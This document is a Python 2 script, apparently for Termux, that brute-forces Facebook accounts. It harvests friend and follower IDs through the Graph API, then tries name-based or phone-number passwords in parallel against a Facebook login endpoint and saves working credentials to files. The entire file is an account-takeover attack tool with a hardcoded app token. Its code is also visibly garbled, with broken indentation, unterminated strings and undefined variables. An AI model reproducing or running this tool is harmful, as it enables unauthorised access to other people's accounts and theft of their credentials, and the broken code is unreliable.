!/usr/bin/python2

 coding=utf-8

 Coded By Kritan XD

 My Facebook ( https://www.facebook.com/MR.KRITAN77 )

 

      (C) Copyright 407 Authentic Exploit

      Rebuild Copyright Can't make u real programmer:)

      Coded By Kritan XD 
      import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser 
 
 reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; CPH1923 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36')] 

def keluar():

	print "\033[0;39m[!] \x1b[0;39mExit"	
  os.sys.exit() 

def acak(b): 
w = 'ahtdzjc'
d = "
for i in x:
d += '!'+w[random.randint(0,len(w)-1)]+i 
return cetak(d)
def cetak(b):
w = 'ahtdzjc'
for i in w:
 j = w.index(i)
 x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
 x += '\033[0m'
 x = x.replace('!0','\033[0m')
 sys.stdout.write(x+'\n')
 def jalan(z):
 for e in z + '\n':
 sys.stdout.write(e)
 sys.stdout.flush()
 time.sleep(00000.1)
  
##### LOGO  #####
logo = """ 
\33[38;1m KRITAN GAUTAM
\33[38;1m NEP ̳̳H̳A̳C̳K̳E̳R̳̳
\33[38;1mW̳E̳ ̳A̳R̳E̳ ̳A̳N̳O̳N̳Y̳M̳O̳U̳S 
\33[38;1mW̳E̳ ̳A̳R̳E̳ ̳L̳E̳G̳I̳O̳N̳̳ 
\33[38;1m0̳3̳2̳3̳2̳1̳3̳2̳3̳6̳2̳
\33[38;1mLoaded....100%

\033[0;35m[\033[0;92m •• \033[0;35m] Author   : KRITAN GAUTAM
\033[1;34m\033[1;41;33mヅ︻写፨丐יי一一一 ҉ ㄹㅇㄹㅇ \033[0m"""
def tik():
titik = ['.   ','..  ','... ']
for o in titik:
print("\r\x1b[0;39mPlease Wait \x1b[0;39m"+o),;sys.stdout.flush();time.sleep(1)
 
back = 0
berhasil = []
KRITAN-CP = []
KRITAN-OK = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """



\033[1;92m♡︎==========================================================================
\033[1;92m{~} \033[0;96mCreater > \x1b[1;91m༒︎𝐊𝐑𝐈𝐓𝐀𝐍-𝐗𝐃
\033[1;92m{~} \033[0;96mFacebook > \x1b[1;91m( https://www.facebook.com/MR.KRITAN77 ) 
\033[1;92m{~} \033[0;96mInstagram > \x1b[1;91mKritan00007
\033[1;92m♡︎==========================================================================
def main():
os.system("clear")
print(logo)
print(" \x1b[1;92m    \tMain menu")
print("")

os.system('echo -e ============================"| lolcat')
	print(" \x1b[1;92m     [1] START CLONING\n")
	os.system('echo -e ============================"| lolcat')
	print("")
	os.system('xdg-open https://www.facebook.com/MR.KRITAN77 ')
	log_sel()
def log_sel():
	sel = raw_input(" Choose an option :)
	if sel =="A":
		login()
	elif sel =="B":
		ran()
	
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def login():
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except(KeyError , IOError):
		os.system("clear")
		print(logo)
		print("")
		print(" \x1b[1;91m  \tFacebook login")
		print("")
		os.system('echo -e "==================================="| lolcat')
		print(" \x1b[1;91m   [1] FACEBOOK ID/PASS LOGIN\n")
		print(" \x1b[1;92m   [2] FACEBOOK TOKEN LOGIN\n")
		print("  \x1b[1;91m  [3] Back ")
		os.system('echo -e "-==================================="| lolcat')
		print("")
		log_select()
def log_select():
	sel = raw_input(" Choose an option: ")
	if sel =="A":
		log_fb()
	elif sel =="B":
		token()
	elif sel =="C":
		ran()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()
def log_fb():
	os.system("clear")
	try:
		token = open("access_token.txt", "r").read()
		menu()
	except (KeyError , IOError):
		print(logo)
		print("")
		print("\tFacebook id/pass login")
		print("")
		uid = raw_input(" Uid: ")
		passw = raw_input(" Password: ")
		data = requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+passw+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true", headers=header).text
		q = json.loads(data)
		if "access_token" in q:
			sav = open("access_token.txt", "w")
			sav.write(q["access_token"])
			sav.close()
			menu()
		elif "www.facebook.com" in q["error"]:
			print("")
			print("\tAccount has checkpoint")
			print("")
			time.sleep(1)
			login()
		else:
			print("")
			print("\tId/pass my be wrong")
			print("")
			time.sleep(1)
def token():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        print(logo)
        print("")
        print("\tLogin token")
        print("")
        os.system('echo -e "====================="| lolcat')
        token = raw_input        [Paste token </3 ]
        os.system('echo -e "====================="| lolcat')
        sav = open("access_token.txt", "w")
        sav.write(token)
        sav.close()
        login()
def menu():
    os.system("clear")
    try:
        token = open("access_token.txt", "r").read()
    except(KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        print(logo)
        print("")
        print("\tLogged in token has expired")
        os.system("rm -rf access_token.txt")
        print("")
        time.sleep(1)
        login()
    os.system("clear")
    print(logo)
    print("")
    print("   Welcome: "+name)
    print("")
    print("    Free mode :Actvited")
    print("")
    print("")
    os.system('echo -e "============================"| lolcat')
    print(" \x1b[1;92m[1]  BRUTE AUTO PASS\n")
    print(" \x1b[1;91m[2]  BRUTE CHOICE PASS\n")
    print(' \x1b[1;90m[3]   BACK')
    os.system('echo -e "============================"| lolcat')
    print("")
    menu_option()
def menu_option():
	select = raw_input(" Choose option: ")
	if select =="1":
		crack()
	elif select =="2":
		choice()
		
	else:
		print("")
		print("\tSelect valid option")
		print("")
		menu_option()
def crack():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found ")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\t    \033[1;32mAUTO PASS CLONING\033[0;97m")
	print("")
	os.system('echo -e "_____________________________________"| lolcat')
	print("\x1b[1;92m       [1] BRUTE PUBLIC ID")
	print("\x1b[1;92m       [2] BRUTE FOLLOWERS")
	print(" \x1b[1;92m      [0] BACK")
	os.system('echo -e "_____________________________________"| lolcat')
	print("")
	crack_select()
def crack_select():
	select = raw_input(" Choose option: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\tAUTO PASS CRAKING")
		print("")
		idt = raw_input("  Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print("\tAUTO PASS CRAKING")
			print('')
			print("  Cloning from : "+q["name"])
		except KeyError:
			print("\tInvalid link OR token")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\tAUTO PASS CRACKING")
		print("")
		idt = raw_input("  Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\tAUTO PASS CRAKING')
			print('')
			print("  Cloning from: "+q["name"])
		except KeyError:
			print("\tInvalid id link OR token")
			print("")
			raw_input(" Press enter to back")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t    \033[1;31mSelect valid option\033[0;97m")
		print("")
		crack_select()
	os.system('echo -e "___________KR1T9N_______________"| lolcat')
	print(" \x1b[1;92m   Total IDs : "+str(len(id)))
	print(" \x1b[1;91m   The Process has started")
	print("   \x1b[1;91m Press ctrl + z to stop")
	os.system('echo -e "__________________________________"| lolcat')
	print("")
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		biran = random.choice(birth)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			pass1 = name.lower()+"123"
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [कृतन OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("कृतनok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [कृतन CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("कृतन cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower()+"1234"
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [कृतन OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("कृतनok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [कृतन CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("कृतनcp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower()+"12345"
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [कृतन OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("कृतनok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [कृतन CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("कृतनcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower()+"786"
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [कृतन OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("कृतन ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [कृतन CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("कृतन cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower()+'1122'
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [कृतन OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("कृतनok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [कृतन CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("कृतनcp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	print("")
	os.system('echo -e "_____________________KR1T9N______________________"| lolcat')
	print("   \x1b[1;91mThe process has been completed")
	print("   \x1b[1;92m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	os.system('echo -e "_____________________________________________________"| lolcat')
	print("")
	print(" cloning सकिय पछि termux फेरी खोल्नु होस् धन्यबा ")
	raw_input(" Press enter to back ")
	menu()
def choice():
	global token
	os.system("clear")
	try:
		token = open("access_token.txt","r").read()
	except IOError:
		print("")
		print("\tToken not found")
		time.sleep(1)
		login_choice()
	os.system("clear")
	print(logo)
	print("")
	print("\t    \033[1;32mCHOICE PASS CRACK MENU\033[0;97m")
	print("")
	os.system('echo -e "_____________________________________"| lolcat')
	print("\x1b[1;92m       [1] BRUTE PUBLIC ID")
	print("\x1b[1;92m       [2] BRUTE FOLLOWERS")
	print(" \x1b[1;92m      [0] BACK")
	os.system('echo -e "_______________________________________"| lolcat')
	print("")
	choice_select()
def choice_select():
	select = raw_input("Choose option: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print("")
		print("\CHOICE PASS CRACK CRACKING")
		print("")
		pass1 = raw_input(" Password: ")
		pass2 = raw_input(" Password: ")
		pass3 = raw_input(" Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\Choice pass cracking')
			print("")
			print(" Cloning from : "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="2":
		os.system("clear")
		print(logo)
		print("")
		print("\CHOICE PASS CRACK CRACKING")
		print("")
		pass1 = raw_input(" Password: ")
		pass2 = raw_input(" Password: ")
		pass3 = raw_input(" Password: ")
		idt = raw_input(" Input id: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			print(logo)
			print('')
			print('\Choice pass cracking')
			print('')
			print(" Cloning from: "+q["name"])
		except KeyError:
			print("\tInvalid id link")
			print("")
			raw_input(" Press enter to back")
			choice()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			nm = na.rsplit(" ")[0]
			id.append(uid+"|"+nm)
	elif select =="0":
	    menu()
	else:
		print("")
		print("\tSelect valid option\033[0;97m")
		print("")
		choice_select()
	os.system('echo -e "__________KR1T9N_____________"| lolcat')
	print(" \x1b[1;92m   Total IDs : "+str(len(id)))
	print(" \x1b[1;90m   The Process has started")
	print("    \x1b[1;91m Press ctrl + z to stop")
	os.system('echo -e "_______________________________"| lolcat')
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		ranagent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [कृतन OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("कृतन ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [कृतन CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("कृतनcp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [कृतन OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("कृतनok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [कृतनCP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("कृतन cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [कृतन OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("कृतन ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [कृतन CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("कृतनcp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	print("")
	os.system('echo -e "___________________________________________________"| lolcat')
	print("   \x1b[1;91mThe process has been completed")
	print("   \x1b[1;92m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	os.system('echo -e "____________________________________________________"| lolcat')
	print("")
	print("cloning सकिय पछि termux फेरी खोल्नु होस् धन्यबा ")
	raw_input(" Press enter to back ")
	choice()
def ran():
	id=[]
	cps=[]
	oks=[]
	os.system("clear")
	print(logo)
	print("")
	print("\tRandom number cloning")
	print("")
	co = raw_input(" Enter number: ")
	k = "+92"
	try:
		file = ".txt"
		for line in open(file, "r").readlines():
			id.append(line.strip())
	except:
		exit(" An error has occured")
	print("  Total numbers: "+str(len(id)))
	print("  The process has started")
	print("  Press ctrl + z to stop")
	print(' ')
	print(47*"-")
	print('')
	print("")
	def main(arg):
		user=arg
		ranagent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': ranagent})
		try:
			pass1 = "786786"
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m[कृतन OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
				ok = open("कृतनok.txt", "a")
				ok.write(k+co+user+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [कृतन CP] "+k+co+user+" | "+pass1+"\033[0;97m")
					cp = open("कृतनcp.txt", "a")
					cp.write(k+co+user+"|"+pass1+"\n")
					cp.close()
					cps.append(k+co+user+pass1)
				else:
					pass2 = user
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m[कृतन OK] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
						ok = open("कृतनok.txt", "a")
						ok.write(k+co+user+"|"+pass2+"\n")
						ok.close()
						oks.append(k+co+user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [कृतन CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("कृतनcp.txt", "a")
							cp.write(k+co+user+"|"+pass2+"\n")
							cp.close()
							cps.append(k+co+user+pass2)
						else:
							pass3 = k+co+user
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+k+co+user+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true").text
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m[कृतन OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
								ok = open("कृतनok.txt", "a")
								ok.write(k+co+user+"|"+pass3+"\n")
								ok.close()
								oks.append(k+co+user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [कृतन CP] "+k+co+user+" | "+pass3+"\033[0;97m")
									cp = open("कृतनcp.txt", "a")
									cp.write(k+co+user+"|"+pass3+"\n")
									cp.close()
									cps.append(k+co+user+pass3)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	print("")
	os.system('echo -e "__________________________________________________"| lolcat')
	print("   \x1b[1;91mThe process has been completed")
	print("   \x1b[1;92m Total Ok/Cp: "+str(len(oks))+"/"+str(len(cps)))
	os.system('echo -e "__________________________________________________"| lolcat')
	print("")
	print("cloning सकिय पछि termux फेरी खोल्नु होस् धन्यबा  ")
	raw_input(" Press enter to back ")
	main()
	
	
if __name__ == '__main__':
	main()

